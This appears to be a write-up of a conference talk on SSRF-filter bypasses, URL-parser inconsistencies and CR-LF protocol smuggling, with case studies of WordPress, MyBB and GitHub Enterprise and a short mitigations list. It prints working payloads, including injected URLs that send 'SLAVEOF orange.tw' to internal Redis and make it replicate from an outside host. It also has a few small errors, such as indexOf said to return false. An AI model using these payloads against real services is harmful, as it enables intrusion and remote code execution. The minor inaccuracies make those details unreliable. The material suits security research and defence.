# GLibc NSS Features and URL Parsing Exploits

## Introduction
This document explores various techniques for exploiting GLibc NSS (Name Service Switch) features, particularly in the context of URL parsing and protocol smuggling. These vulnerabilities can be leveraged to bypass security measures and perform unauthorized actions.

## Exploiting GLibc NSS Features on URL Parsing

### Example 1: Double Decoding
**URL:** `http://127.0.0.1%2509foo.google.com`

**Explanation:**
Some library implementations decode the URL twice, leading to unexpected behavior. This can be exploited to inject malicious payloads or bypass filters.

### Example 2: Protocol Smuggling
**HTTP/1.1 Requirement:**
The HTTP/1.1 protocol requires a `Host` header. By manipulating this header, one can smuggle other protocols within the URL.

**Example Command:**
```sh
$ curl -vvv http://I-am-a-very-very-weird-domain.com
```

**Output:**
```http
>> GET / HTTP/1.1
>> Host: I-am-a-very-very-weird-domain.com
>> User-Agent: curl/7.53.1
>> Accept: */*
```

**Exploit:**
```sh
$ nc -vvlp 6379
>> GET / HTTP/1.1
>> Host: 127.0.0.1
>> SLAVEOF orange.tw 6379
>> :6379
>> Connection: close
```

**HTTPS Example:**
```sh
$ nc -vvlp 443
>> ..=53210...EDCB..
>> .....5'%"127.0.0.1
>> SET foo 0 60 5
```

**SNI Injection:**
Embedding the hostname in the SSL Client Hello message can be used to inject additional protocols. Simply replace `HTTP` with `HTTPS` in the URL.

## Breaking the Patch of Python CVE-2016-5699

### CR-LF Injection in `HTTPConnection.putheader()`
**Vulnerability:**
The patch for Python CVE-2016-5699 aimed to prevent CR-LF injection in header values. However, it can be bypassed by using a leading space.

**Example:**
```python
import urllib
url = 'http://0\r\n SLAVEOF orange.tw 6379\r\n :80'
urllib.urlopen(url)
```

**Bypass:**
By adding a leading space, the CR-LF injection can be executed successfully.

### Redis and Memcached Exploitation
**Example:**
```sh
http://0\r\n SLAVEOF orange.tw 6379\r\n :6379/
>> GET / HTTP/1.0
> Host: 0
>
SLAVEOF orange.tw 6379
```

**IDNA Standard Inconsistencies:**
Different IDNA standards used by URL parsers and requesters can lead to inconsistencies. For example:
```javascript
"ß".toLowerCase() // "ß"
"ß".toUpperCase() // "SS"
["ss", "SS"].indexOf("ß") // false
location.href = "http://wordpreß.com"
```

## Abusing URL Parsers - Case Study

### WordPress
1. **SSRF Protections:**
   - Paid significant attention to SSRF protections.
   - Found three distinct ways to bypass these protections.
   - Bugs reported since February 25, 2017, but still unpatched.
   - For responsible disclosure, MyBB is used as a case study.

### Main Concept
Finding different behaviors among URL parsers, DNS checkers, and URL requesters.

| Component | WordPress | vBulletin | MyBB |
|-----------|-----------|------------|------|
| URL Parser | `parse_url()` | `parse_url()` | `parse_url()` |
| DNS Checker | `gethostbyname()` | None | `gethostbynamel()` |
| URL Requester | *cURL* | *cURL* | *cURL* |

### SSRF Bypass Techniques

#### Technique 1: Time-of-check to Time-of-use Problem
1. Parse the URL and check for valid components.
2. Check if the host is not in the disallowed list.
3. Fetch the URL using cURL, which may query DNS again, leading to SSRF.

#### Technique 2: Inconsistency between DNS Checker and URL Requester
No IDNA converter in `gethostbynamel()`, but cURL has one.

**Example:**
```php
$url = 'http://ß.orange.tw/'; // 127.0.0.1
$host = parse_url($url)[host];
$addresses = gethostbynamel($host); // bool(false)
if ($address) {
    // check if address in white-list
}
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_exec($ch);
```

#### Technique 3: Inconsistency between URL Parser and URL Requester
Fixed in PHP 7.0.13 and cURL 7.54.

**Example:**
```php
$url = 'http://127.0.0.1:11211#@google.com:80/';
$parsed = parse_url($url);
var_dump($parsed[host]); // string(10) "google.com"
var_dump($parsed[port]); // int(80)
curl($url);
```

## Protocol Smuggling - Case Study

### GitHub Enterprise
- Standalone version of GitHub.
- Written in Ruby on Rails with obfuscated code.

### Vulnerabilities
1. **SSRF-Bypass on Webhooks:**
   - Fetching URL by `gem faraday`.
   - Blacklisting hosts by `gem faraday-restrict-ip-addresses`.
   - Bypassed with a zero: `http://0/`.

2. **SSRF in Internal Graphite Service:**
   - Graphite bound on `127.0.0.1:8000`.
   - URL split and connection made using `HTTPConnection`.

3. **CR-LF Injection in Graphite:**
   - Graphite written in Python.
   - Uses `httplib.HTTPConnection` which suffers from CR-LF injection.
   - Example: `http://0:8000/composer/send_email?to=PI:EMAIL&url=http://127.0.0.1:6379/%0D%0ASET…`

4. **Unsafe Marshal in Memcached Gem:**
   - Memcached gem used as cache client.
   - All Ruby objects stored in cache are Marshal-ed.

### Execution Chain
Combining these vulnerabilities can lead to remote code execution (RCE).

### Mitigations
- **Application Layer:**
  - Use only IP and hostname, do not reuse the input URL.
- **Network Layer:**
  - Use firewalls or network policies to block intranet traffic.

### Projects
- **SafeCurl** by @fin1te
- **Advocate** by @JordanMilne

### Summary
- New attack surface on SSRF-bypass.
- URL parsing issues and IDNA standard abuse.
- New attack vectors on protocol smuggling.
- Linux Glibc NSS features and NodeJS Unicode failures.

### Acknowledgements
- Invalid URL parsing with '#' by @bagder
- URL Interop by @bagder
- Shibuya.XSS #8 by @mala
- SSRF Bible by @Wallarm
- Special thanks to Allen Own, Birdman Chiu, Henry Huang

### Further Works
- URL parser issues in OAuth
- URL parser issues in modern browsers
- URL parser issues in proxy servers

**Thanks!**
- PI:EMAIL
- @orange_8361